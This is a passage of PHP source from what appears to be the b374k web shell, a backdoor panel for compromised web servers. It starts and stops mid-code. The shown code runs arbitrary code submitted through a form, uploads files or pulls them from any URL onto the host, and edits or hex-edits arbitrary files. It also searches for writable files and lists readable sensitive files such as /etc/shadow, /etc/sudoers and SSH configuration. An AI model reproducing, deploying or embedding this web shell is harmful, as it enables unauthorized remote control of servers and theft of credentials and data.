						$s_res = $s_win ? exe($s_scriptout):exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
						rename($s_scriptout, $s_scriptout."del");
						unlink($s_scriptout."del");
					}
					unlink($s_script.".c");
				}
				chdir($s_cwd);
			}
			elseif(strtolower($s_lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$s_code, $s_r)){
					$s_classname = trim($s_r[1]);
					$s_script = $s_classname;
				}
				else{
					$s_rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
					$s_script = $s_rand;
					$s_code = "class ".$s_rand." { ".$s_code . " } ";
				}
				chdir($s_tmpdir);
				if(file_put_contents($s_script.".java", $s_code)!==false){
					$s_res = exe("javac ".$s_script.".java");
					if(@is_file($s_script.".class")){
						$s_res .= exe("java ".$s_evaloption." ".$s_script);
						unlink($s_script.".class");
					}
					unlink($s_script.".java");
				}
				chdir($s_pwd);
			}
		}

		$s_lang_available = "<option value='php'>php</option>";
		$s_selected = "";
		$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java");
		foreach($s_access as $s){
			if(isset($$s)){
				$s_t = explode("_", $s);
				$s_checked = ($s_lang == $s_t[1])? "selected" : "";
				$s_lang_available .= "<option value='".$s_t[1]."' ".$s_checked.">".$s_t[1]."</option>";
			}
		}

		$s_evaloptionclass = ($s_lang=="php")? "sembunyi":"";
		$s_e_result = (!empty($s_res))? "<pre id='evalres' class='border-top' style='margin:4px 0 0 0;padding:6px 0;' >".hss($s_res)."</pre>":"";
		$s_result .= "<form action='".$s_self."' method='post'>
					<textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'>".hss($s_code)."</textarea>
					<table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /></p>
					</td><td><select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'>
					".$s_lang_available."
					</select>
					</td>
					<td><div title='If you want to give additional option to interpreter or compiler, give it here' id='additionaloption' class='".$s_evaloptionclass."'>Additional option&nbsp;&nbsp;<input class='inputz' style='width:400px;' type='text' name='evaloption' value='".$s_evaloption."' id='evaloption' /></div></td>
					</tr>
					</table>
					".$s_e_result."
					<input type='hidden' name='x' value='eval' />
					</form>";
	} // find
	elseif(isset($_GP['find'])){
		$s_p = $_GP['find'];

		$s_type = isset($_GP['type'])? $_GP['type'] : "sfile";
		$s_sfname = (!empty($_GP['sfname']))? $_GP['sfname']:'';
		$s_sdname = (!empty($_GP['sdname']))? $_GP['sdname']:'';
		$s_sfcontain = (!empty($_GP['sfcontain']))? $_GP['sfcontain']:'';

		$s_sfnameregexchecked = $s_sfnameicasechecked = $s_sdnameregexchecked = $s_sdnameicasechecked = $s_sfcontainregexchecked = $s_sfcontainicasechecked = $s_swritablechecked = $s_sreadablechecked = $s_sexecutablechecked = "";
		$s_sfnameregex = $s_sfnameicase = $s_sdnameregex = $s_sdnameicase = $s_sfcontainregex = $s_sfcontainicase = $s_swritable = $s_sreadable = $s_sexecutable = false;

		if(isset($_GP['sfnameregex'])){ $s_sfnameregex=true; $s_sfnameregexchecked="checked"; }
		if(isset($_GP['sfnameicase'])){ $s_sfnameicase=true; $s_sfnameicasechecked="checked"; }
		if(isset($_GP['sdnameregex'])){ $s_sdnameregex=true; $s_sdnameregexchecked="checked"; }
		if(isset($_GP['sdnameicase'])){ $s_sdnameicase=true; $s_sdnameicasechecked="checked"; }
		if(isset($_GP['sfcontainregex'])){ $s_sfcontainregex=true; $s_sfcontainregexchecked="checked"; }
		if(isset($_GP['sfcontainicase'])){ $s_sfcontainicase=true; $s_sfcontainicasechecked="checked"; }
		if(isset($_GP['swritable'])){ $s_swritable=true; $s_swritablechecked="checked"; }
		if(isset($_GP['sreadable'])){ $s_sreadable=true; $s_sreadablechecked="checked"; }
		if(isset($_GP['sexecutable'])){ $s_sexecutable=true; $s_sexecutablechecked="checked"; }

		$s_sexecb = (function_exists("is_executable"))? "<input class='css-checkbox' type='checkbox' name='sexecutable' value='sexecutable' id='se' ".$s_sexecutablechecked." /><label class='css-label' for='se'>Executable</span>":"";

		$s_candidate = array();
		if(isset($_GP['sgo'])){
			$s_af = "";

			$s_candidate = getallfiles($s_p);
			if($s_type=='sfile') $s_candidate = @array_filter($s_candidate, "is_file");
			elseif($s_type=='sdir') $s_candidate = @array_filter($s_candidate, "is_dir");

			foreach($s_candidate as $s_a){
				if($s_type=='sdir'){
					if(!empty($s_sdname)){
						if($s_sdnameregex){
							if($s_sdnameicase){if(!preg_match("/".$s_sdname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sdname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sdnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sdname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos(basename($s_a), $s_sdname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
				}
				elseif($s_type=='sfile'){
					if(!empty($s_sfname)){
						if($s_sfnameregex){
							if($s_sfnameicase){if(!preg_match("/".$s_sfname."/i", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sfname."/", basename($s_a))) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sfnameicase){if(strpos(strtolower(basename($s_a)), strtolower($s_sfname))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos(basename($s_a), $s_sfname)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
					if(!empty($s_sfcontain)){
						$s_sffcontent = @file_get_contents($s_a);
						if($s_sfcontainregex){
							if($s_sfcontainicase){if(!preg_match("/".$s_sfcontain."/i", $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(!preg_match("/".$s_sfcontain."/",  $s_sffcontent)) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
						else{
							if($s_sfcontainicase){if(strpos(strtolower($s_sffcontent), strtolower($s_sfcontain))===false) $s_candidate = array_diff($s_candidate, array($s_a));}
							else{if(strpos($s_sffcontent, $s_sfcontain)===false) $s_candidate = array_diff($s_candidate, array($s_a));}
						}
					}
				}
			}
		}

		$s_f_result = ""; $s_link="";
		foreach($s_candidate as $s_c){
			$s_c = trim($s_c);
			if($s_swritable && !@is_writable($s_c)) continue;
			if($s_sreadable && !@is_readable($s_c)) continue;
			if($s_sexecutable && !@is_executable($s_c)) continue;

			if($s_type=="sfile") $s_link = $s_self."view=".$s_c;
			elseif($s_type=="sdir") $s_link = $s_self."view=".cp($s_c);
			$s_f_result .= "<p class='notif' ondblclick=\"return go('".adds($s_link)."',event);\"><a href='".$s_link."'>".$s_c."</a></p>";
		}

		$s_tsdir = ($s_type=="sdir")? "selected":"";
		$s_tsfile = ($s_type=="sfile")? "selected":"";

		if(!@is_dir($s_p)) $s_result .= notif("Cannot find the path specified ".$s_p);

		$s_result .= "<form action='".$s_self."' method='post'>
		<div class='mybox'><h2>Find</h2>
		<table class='myboxtbl'>
		<tr><td style='width:140px;'>Search in</td>
		<td colspan='2'><input style='width:100%;' value='".$s_p."' class='inputz' type='text' name='find' /></td></tr>
		<tr onclick=\"findtype('sdir');\">
			<td>Dirname contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='".$s_sdname."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sdnameregex' id='sdn' ".$s_sdnameregexchecked." /><label class='css-label' for='sdn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sdnameicase' id='sdi' ".$s_sdnameicasechecked." /><label class='css-label' for='sdi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>Filename contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='".$s_sfname."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfnameregex'  id='sfn' ".$s_sfnameregexchecked." /><label class='css-label' for='sfn'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfnameicase'  id='sfi' ".$s_sfnameicasechecked." /><label class='css-label' for='sfi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>File contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".$s_sfcontain."' /></td>
			<td>
				<input type='checkbox' class='css-checkbox' name='sfcontainregex' id='sff' ".$s_sfcontainregexchecked." /><label class='css-label' for='sff'>Regex (pcre)</label>
				<input type='checkbox' class='css-checkbox' name='sfcontainicase' id='sffi' ".$s_sfcontainicasechecked." /><label class='css-label' for='sffi'>Case Insensitive</label>
			</td>
		</tr>
		<tr>
			<td>Permissions</td>
			<td colspan='2'>
				<input type='checkbox' class='css-checkbox' name='swritable' id='sw' ".$s_swritablechecked." /><label class='css-label' for='sw'>Writable</label>
				<input type='checkbox' class='css-checkbox' name='sreadable' id='sr' ".$s_sreadablechecked." /><label class='css-label' for='sr'>Readable</label>
				".$s_sexecb."
			</td>
		</tr>
		<tr><td>
		<input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:0;' />
		</td>
		<td>
		<select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:0;padding:4px;'>
			<option value='sfile' ".$s_tsfile.">Search file</option>
			<option value='sdir' ".$s_tsdir.">Search dir</option>
		</select>
		</td>
		<td></td></tr>
		</table>
		</div>
		</form>
		<div>
		".$s_f_result."
		</div>";
	} // upload
	elseif(isset($_GP['x']) && ($_GP['x']=='upload')){
		$s_result = " ";
		$s_msg = "";
		if(isset($_GP['uploadhd'])){
			$c = count($_FILES['filepath']['name']);
			for($i = 0; $i<$c; $i++){
				$s_fn = $_FILES['filepath']['name'][$i];
				if(empty($s_fn)) continue;
				if(is_uploaded_file($_FILES['filepath']['tmp_name'][$i])){
					$s_p = cp($_GP['savefolder'][$i]);
					if(!@is_dir($s_p)) mkdir($s_p);
					if(isset($_GP['savefilename'][$i]) && (trim($_GP['savefilename'][$i])!="")) $s_fn = $_GP['savefilename'][$i];
					$s_tm = $_FILES['filepath']['tmp_name'][$i];
					$s_pi = cp($s_p).$s_fn;
					$s_st = @move_uploaded_file($s_tm,$s_pi);
					if($s_st) $s_msg .= notif("File uploaded to <a href='".$s_self."view=".$s_pi."'>".$s_pi."</a>");
					else $s_msg .= notif("Failed to upload ".$s_fn);
				}
				else $s_msg .= notif("Failed to upload ".$s_fn);
			}
		}
		elseif(isset($_GP['uploadurl'])){
			// function dlfile($s_url,$s_fpath)
			$c = count($_GP['fileurl']);
			for($i = 0; $i<$c; $i++){
				$s_fu = $_GP['fileurl'][$i];
				if(empty($s_fu)) continue;

				$s_p = cp($_GP['savefolderurl'][$i]);
				if(!@is_dir($s_p)) mkdir($s_p);

				$s_fn = basename($s_fu);
				if(isset($_GP['savefilenameurl'][$i]) && (trim($_GP['savefilenameurl'][$i])!="")) $s_fn = $_GP['savefilenameurl'][$i];
				$s_fp = cp($s_p).$s_fn;
				$s_st = dlfile($s_fu,$s_fp);
				if($s_st) $s_msg .= notif("File uploaded to <a href='".$s_self."view=".$s_fp."'>".$s_fp."</a>");
				else $s_msg .= notif("Failed to upload ".$s_fn);
			}
		}
		else{
			if(!@is_writable($s_cwd)) $s_msg = notif("Directory ".$s_cwd." is not writable, please change to a writable one");
		}

		if(!empty($s_msg)) $s_result .= $s_msg;
		$s_result .= "
			<form action='".$s_self."' method='post' enctype='multipart/form-data'>
			<div class='mybox'><h2><div class='but' onclick='adduploadc();'>+</div>Upload from computer</h2>
			<table class='myboxtbl'>
			<tbody id='adduploadc'>
			<tr><td style='width:140px;'>File</td><td><input type='file' name='filepath[]' class='inputzbut' style='width:400px;margin:0;' /></td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder[]' value='".$s_cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename[]' value='' /></td></tr>
			</tbody>
			<tfoot>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</tfoot>
			</table>
			</div>
			</form>
			<form action='".$s_self."' method='post'>
			<div class='mybox'><h2><div class='but' onclick='adduploadi();'>+</div>Upload from internet</h2>
			<table class='myboxtbl'>
			<tbody id='adduploadi'>
			<tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl[]' value='' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl[]' value='".$s_cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl[]' value='' /></td></tr>
			</tbody>
			<tfoot>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			<input type='hidden' name='x' value='upload' />
			</td></tr>
			</table>
			</div>
			</form>";
	} // view file
	elseif(isset($_GP['view'])){
		$s_f = $_GP['view'];
		if(isset($s_fnew) && (trim($s_fnew)!="")) $s_f = $s_fnew;

		$s_owner = "";
		if(@is_file($s_f)){
			$targetdir = dirname($s_f);
			chdir($targetdir);
			$s_cwd = cp(getcwd());
			setcookie("cwd", $s_cwd ,time() + $s_login_time);

			if(!$s_win && $s_posix){
				$s_name = posix_getpwuid(fileowner($s_f));
				$s_group = posix_getgrgid(filegroup($s_f));
				$s_owner = "<tr><td>Owner</td><td>".$s_name['name']."<span class='gaya'>:</span>".$s_group['name']."</td></tr>";
			}
			$s_filn = basename($s_f);
			$s_dlfile = get_archiver_available();
			$s_dlfile = str_replace("__dlpath__",$s_filn,$s_dlfile);
			$s_dlfile = str_replace("__dlcwd__",$s_cwd,$s_dlfile);
			$s_result .= "<table class='viewfile' style='width:100%;'>
			<tr><td style='width:140px;'>Filename</td><td><span id='".cs($s_filn)."_link'>".$s_f."</span>
			<div id='".cs($s_filn)."_form' class='sembunyi'>
			<form action='".$s_self."' method='post'>
				<input type='hidden' name='oldname' value='".$s_f."' style='margin:0;padding:0;' />
				<input type='hidden' name='view' value='".$s_f."' />
				<input class='inputz' style='width:200px;' type='text' name='rename' value='".$s_f."' />
				<input class='inputzbut' type='submit' value='rename' />
			</form>
			<input class='inputzbut' type='button' value='x' onclick=\"tukar_('".cs($s_filn)."_form','".cs($s_filn)."_link');\" />
			</div>
			</td></tr>
			<tr><td>Size</td><td>".gs($s_f)." (".@filesize($s_f).")</td></tr>
			<tr><td>Permission</td><td>".gp($s_f)."</td></tr>
			".$s_owner."
			<tr><td>Create time</td><td>".@date("d-M-Y H:i:s",filectime($s_f))."</td></tr>
			<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($s_f))."</td></tr>
			<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($s_f))."</td></tr>
			<tr><td>Actions</td><td>
			<a href='".$s_self."edit=".$s_f."' title='edit'>edit</a> | <a href='".$s_self."hexedit=".$s_f."' title='edit as hex'>hex</a> | <a href=\"javascript:tukar_('".cs($s_filn)."_link','".cs($s_filn)."_form');\" title='rename'>ren</a> | <a href='".$s_self."del=".$s_f."' title='delete'>del</a> ".$s_dlfile."
			</td></tr>
			<tr><td>View</td><td>
			<a href='".$s_self."view=".$s_f."&type=text'>text</a> | <a href='".$s_self."view=".$s_f."&type=code'>code</a> | <a href='".$s_self."view=".$s_f."&type=image'>image</a> | <a href='".$s_self."view=".$s_f."&type=audio'>audio</a> | <a href='".$s_self."view=".$s_f."&type=video'>video</a>
			</td></tr>
			</table>";

			$s_t = ""; $s_mime = "";
			$s_mime_list = gzinflate(base64_decode($s_mime_types));
			$s_ext_pos = strrpos($s_f, ".");
			if($s_ext_pos!==false){
				$s_ext = trim(substr($s_f, $s_ext_pos),".");
				if(preg_match("/([^\s]+)\ .*\b".$s_ext."\b.*/i",$s_mime_list,$s_r)){
					$s_mime = $s_r[1];
				}
			}

			$s_iinfo = @getimagesize($s_f);
			if(strtolower(substr($s_filn,-3,3)) == "php") $s_t = "code";
			elseif(is_array($s_iinfo)) $s_t = 'image';
			elseif(!empty($s_mime)) $s_t = substr($s_mime,0,strpos($s_mime,"/"));

			if(isset($_GP['type'])) $s_t = $_GP['type'];

			if($s_t=="image"){
				$s_width = (int) $s_iinfo[0];
				$s_height = (int) $s_iinfo[1];
				$s_imginfo = "Image type = ( ".$s_iinfo['mime']." )<br />
					Image Size = <span class='gaul'>( </span>".$s_width." x ".$s_height."<span class='gaul'> )</span><br />";
				if($s_width > 800){
					$s_width = 800;
					$s_imglink = "<p><a href='".$s_self."img=".$s_filn."'>
					<span class='gaul'>[ </span>view full size<span class='gaul'> ]</span></a></p>";
				}
				else $s_imglink = "";

				$s_result .= "<div class='viewfilecontent' style='text-align:center;'>".$s_imglink."
					<img width='".$s_width."' src='".$s_self."img=".$s_filn."' alt='".$s_filn."' style='margin:8px auto;padding:0;border:0;' /></div>";

			}
			elseif($s_t=="code"){
				$s_result .= "<div class=\"viewfilecontent\">";
				$s_file = wordwrap(@file_get_contents($s_f),160,"\n",true);
				$s_buff = highlight_string($s_file,true);
				$s_old = array("0000BB", "000000", "FF8000", "DD0000", "007700");
				$s_new = ($s_theme=="bright")? $s_highlight_bright:$s_highlight_dark;
				$s_buff = str_replace($s_old,$s_new, $s_buff);
				$s_result .= $s_buff;
				$s_result .=  "</div>";
			}
			elseif($s_t=="audio" || $s_t=="video"){
				$s_result .= "<div class='viewfilecontent' style='text-align:center;'>
							<".$s_t." controls>
							<source src='".$s_self."dltype=raw&dlpath=".$s_f."' type='".$s_mime."'>
								<object data='".$s_self."dltype=raw&dlpath=".$s_f."'>
									<embed src='".$s_self."dltype=raw&dlpath=".$s_f."'>
								</object>
							</".$s_t.">
							</div>";
			}
			else {
				$s_result .= "<pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'>";
				$s_result .=  str_replace("<", "&lt;",str_replace(">", "&gt;",(wordwrap(@file_get_contents($s_f),160,"\n",true))));
				$s_result .=   "</pre>";
			}
		}
		elseif(@is_dir($s_f)){
			chdir($s_f);
			$s_cwd = cp(getcwd());
			setcookie("cwd", $s_cwd ,time() + $s_login_time);
			$s_result .= showdir($s_cwd);
		}
		else $s_result .= notif("Cannot find the path specified ".$s_f);

	} // edit file
	elseif(isset($_GP['edit'])){
		$s_f = $_GP['edit'];
		$s_fc = ""; $s_fcs = "";

		if(isset($_GP['new']) && ($_GP['new']=='yes')){
			$s_num = 1;
			if(@is_file($s_f)){
				$s_pos = strrpos($s_f,"_");
				if($s_pos!==false) $s_num = (int) substr($s_f,$s_pos+1);
				while(@is_file(substr($s_f,0,$s_pos)."_".$s_num)){
					$s_num++;
				}
				$s_f = substr($s_f,0,$s_pos)."_".$s_num;
			}
		}
		else if(@is_file($s_f)) $s_fc = @file_get_contents($s_f);

		if(isset($_GP['fc'])){
			$s_fc = $_GP['fc'];
			$s_eol = $_GP['eol'];
			$s_eolf = pack("H*", geol($s_fc));
			$s_eolh = pack("H*", $s_eol);
			$s_fc = str_replace($s_eolf, $s_eolh, $s_fc);

			if($s_filez = fopen($s_f,"w")){
				$s_time = @date("d-M-Y H:i:s",time());
				if(fwrite($s_filez,$s_fc)!==false) $s_fcs = "File saved @ ".$s_time;
				else $s_fcs = "Failed to save";
				fclose($s_filez);
			}
			else $s_fcs = "Permission denied";
		}
		elseif(@is_file($s_f) && !@is_writable($s_f)) $s_fcs = "This file is not writable";

		$s_eol = geol($s_fc);

		if(!empty($s_fcs)) $s_result .= notif($s_fcs);
		$s_result .= "<form action='".$s_self."' method='post'>
				<textarea id='fc' name='fc' class='txtarea'>".hss($s_fc)."</textarea>
				<p style='text-align:center;'><input type='text' class='inputz' style='width:99%;' name='edit' value='".$s_f."' /></p>
				<p><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /></p>
				<input type='hidden' name='eol' value='".$s_eol."' />
				</form>";

	} // hex edit file
	elseif(isset($_GP['hexedit'])){
		$s_f = $_GP['hexedit'];
		$s_fc = "";	$s_fcs = ""; $s_hexes = "";
		$s_lnum = 0;

		if(!empty($_GP['hexes']) || !empty($_GP['hexestxtarea'])){
			if(!empty($_GP['hexes'])){
				foreach($_GP['hexes'] as $s_hex) $s_hexes .= str_replace(" ", "", $s_hex);
			}
			elseif(!empty($_GP['hexestxtarea'])){
				$s_hexes = trim($_GP['hexestxtarea']);
			}
			if($s_filez = fopen($s_f,"w")){
					$s_bins = pack("H*", $s_hexes);
					$s_time = @date("d-M-Y H:i:s", time());
					if(fwrite($s_filez,$s_bins)!==false) $s_fcs = "File saved @ ".$s_time;
					else $s_fcs = "Failed to save";
					fclose($s_filez);
				}
			else $s_fcs = "Permission denied";
		}
		else if(@is_file($s_f) && !@is_writable($s_f)) $s_fcs = "This file is not writable";

		if(!empty($s_fcs)) $s_result .= notif($s_fcs);

		$s_result .= "<form action='".$s_self."' method='post'>
					<p style='padding:0;text-align:center;'><input type='text' class='inputz' style='width:100%;' name='hexedit' value='".$s_f."' /></p>
					<p class='border-bottom' style='padding:0 0 14px 0;'><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return submithex();\" /></p>
					<table class='explore'>";

		if(@is_file($s_f)){
			$s_fp = fopen($s_f, "r");
			if($s_fp) {
				$s_ldump = "";
				$s_counter = 0;
				$s_icounter = 0;
				while(!feof($s_fp)){
					$s_line = fread($s_fp, 32);
					$s_linehex = strtoupper(bin2hex($s_line));
					$s_linex = str_split($s_linehex, 2);
					$s_linehex = implode(" ", $s_linex);
					$s_addr = sprintf("%08xh", $s_icounter);

					$s_result .= "<tr><td style='text-align:center;width:60px;'>".$s_addr."</td><td style='text-align:left;width:594px;'>
					<input onselect='this.selectionEnd=this.selectionStart;' onclick=\"hexupdate('".$s_counter."',event);\" onkeydown=\"return hexfix('".$s_counter."',event);\" onkeyup=\"hexupdate('".$s_counter."',event);\" type='text' class='inputz' id='hex_".$s_counter."' name='hexes[]' value='".$s_linehex."' style='width:578px;' maxlength='".strlen($s_linehex)."' /></td>
					<td style='text-align:left;letter-spacing:2px;'>
					<pre name='hexdump' id='dump_".$s_counter."' style='margin:0;padding:0;'></pre></td></tr>";
					$s_counter++;
					$s_icounter+=32;
				}
				$s_result .= "<input type='hidden' id='counter' value='".$s_counter."' />";
				$s_result .= "<textarea name='hexestxtarea' id='hexestxtarea' class='sembunyi'></textarea>";
				fclose($s_fp);
			}
		}
		$s_result .= "</table></form>";

	} // show server information
	elseif(isset($_GP['x']) && ($_GP['x']=='info')){
		$s_result = "";
		// server misc info
		$s_result .= "<p class='notif' onclick=\"toggle('info_server')\">Server Info</p>";
		$s_result .= "<div class='info' id='info_server'><table>";

		if($s_win){
			foreach (range("A", "Z") as $s_letter){
				if((@is_dir($s_letter.":\\") && @is_readable($s_letter.":\\"))){
					$s_drive = $s_letter.":";
					$s_result .= "<tr><td>drive ".$s_drive."</td><td>".ts(disk_free_space($s_drive))." free of ".ts(disk_total_space($s_drive))."</td></tr>";
				}
			}
		}
		else $s_result .= "<tr><td>root partition</td><td>".ts(@disk_free_space("/"))." free of ".ts(@disk_total_space("/"))."</td></tr>";

		$s_result .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
		$s_access = array("s_python", "s_perl", "s_ruby", "s_node", "s_gcc", "s_java", "s_tar", "s_wget", "s_lwpdownload", "s_lynx", "s_curl");
		foreach($s_access as $s){
			$s_t = explode("_", $s);
			if(isset($$s)) $s_result .= "<tr><td>".$s_t[1]."</td><td>".$$s."</td></tr>";
		}

		if(!$s_win){
			$s_interesting = array(
			"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
			"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
			"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
			"/etc/ssh/sshd_config",
			"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
			foreach($s_interesting as $s_f){
				if(@is_file($s_f) && @is_readable($s_f)) $s_result .= "<tr><td>".$s_f."</td><td><a href='".$s_self."view=".$s_f."'>".$s_f." is readable</a></td></tr>";
			}
		}
		$s_result .= "</table></div>";

		if(!$s_win){
			// cpu info
			if($s_i_buff=trim(@file_get_contents("/proc/cpuinfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_cpu')\">CPU Info</p>";
				$s_result .= "<div class='info' id='info_cpu'>";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				foreach($s_i_buffs as $s_i_buffss){
					$s_i_buffss = trim($s_i_buffss);
					if($s_i_buffss!=""){
						$s_i_buffsss = explode("\n", $s_i_buffss);
						$s_result .= "<table>";
						foreach($s_i_buffsss as $s_i){
							$s_i = trim($s_i);
							if($s_i!=""){
								$s_ii = explode(":",$s_i);
								if(count($s_ii)==2) $s_result .= "<tr><td>".$s_ii[0]."</td><td>".$s_ii[1]."</td></tr>";
							}
						}
						$s_result .= "</table>";
					}
				}
				$s_result .= "</div>";
			}

			// mem info
			if($s_i_buff=trim(@file_get_contents("/proc/meminfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_mem')\">Memory Info</p>";
				$s_i_buffs = explode("\n", $s_i_buff);
				$s_result .= "<div class='info' id='info_mem'><table>";
				foreach($s_i_buffs as $s_i){
					$s_i = trim($s_i);
					if($s_i!=""){
						$s_ii = explode(":",$s_i);
						if(count($s_ii)==2) $s_result .= "<tr><td>".$s_ii[0]."</td><td>".$s_ii[1]."</td></tr>";
					}
					else $s_result .= "</table><table>";
				}
				$s_result .= "</table></div>";
			}

			// partition
			if($s_i_buff=trim(@file_get_contents("/proc/partitions"))){
				$s_i_buff = preg_replace("/\ +/", " ", $s_i_buff);
				$s_result .= "<p class='notif' onclick=\"toggle('info_part')\">Partitions Info</p>";
				$s_result .= "<div class='info' id='info_part'>";
				$s_i_buffs = explode("\n\n", $s_i_buff);
				$s_result .= "<table><tr>";
				$s_i_head = explode(" ", $s_i_buffs[0]);
				foreach($s_i_head as $s_h) $s_result .= "<th>".$s_h."</th>";
				$s_result .= "</tr>";
				$s_i_buffss = explode("\n", $s_i_buffs[1]);
				foreach($s_i_buffss as $s_i_b){
					$s_i_row = explode(" ", trim($s_i_b));
					$s_result .= "<tr>";
					foreach($s_i_row as $s_r) $s_result .= "<td style='text-align:center;'>".$s_r."</td>";
					$s_result .= "</tr>";
				}
				$s_result .= "</table>";
				$s_result .= "</div>";
			}
		}
		$s_phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
		foreach($s_phpinfo as $s_p=>$s_i){
			$s_result .= "<p class='notif' onclick=\"toggle('".$s_i."')\">".$s_p."</p>";
			ob_start();
			eval("phpinfo(".$s_i.");");
			$s_b = ob_get_contents();
			ob_end_clean();
			if(preg_match("/<body>(.*?)<\/body>/is", $s_b, $r)){
				$s_body = str_replace(array(",", ";", "&amp;"), array(", ", "; ", "&"), $r[1]);
				$s_result .= "<div class='info' id='".$s_i."'>".$s_body."</div>";
			}
		}
	} // working with database
	elseif(isset($_GP['x']) && ($_GP['x']=='db')){
		// sqltype : mysql, mssql, oracle, pgsql, sqlite, sqlite3, odbc, pdo
		$s_sql = array();
		$s_sql_deleted = "";
		$s_show_form = $s_show_dbs = true;

		if(isset($_GP['dc'])){
			$k = $_GP['dc'];
			setcookie("c[".$k."]", "" ,time() - $s_login_time);
			$s_sql_deleted = $k;
		}

		if(isset($_COOKIE['c']) && !isset($_GP['connect'])){
			foreach($_COOKIE['c'] as $c=>$d){
				if($c==$s_sql_deleted) continue;
				$s_dbcon = (function_exists("json_encode") && function_exists("json_decode"))? json_decode($d):unserialize($d);
				foreach($s_dbcon as $k=>$v) $s_sql[$k] = $v;
				$s_sqlport = (!empty($s_sql['port']))? ":".$s_sql['port']:"";
				$s_result .= notif("[".$s_sql['type']."] ".$s_sql['user']."@".$s_sql['host'].$s_sqlport."
							<span style='float:right;'><a href='".$s_self."x=db&connect=connect&sqlhost=".$s_sql['host']."&sqlport=".$s_sql['port']."&sqluser=".$s_sql['user']."&sqlpass=".$s_sql['pass']."&sqltype=".$s_sql['type']."'>connect</a> | <a href='".$s_self."x=db&dc=".$c."'>disconnect</a></span>");
			}
		}
		else{
			$s_sql['host'] = isset($_GP['sqlhost'])? $_GP['sqlhost'] : "";
			$s_sql['port'] = isset($_GP['sqlport'])? $_GP['sqlport'] : "";
			$s_sql['user'] = isset($_GP['sqluser'])? $_GP['sqluser'] : "";
			$s_sql['pass'] = isset($_GP['sqlpass'])? $_GP['sqlpass'] : "";
			$s_sql['type'] = isset($_GP['sqltype'])? $_GP['sqltype'] : "";
		}

		if(isset($_GP['connect'])){
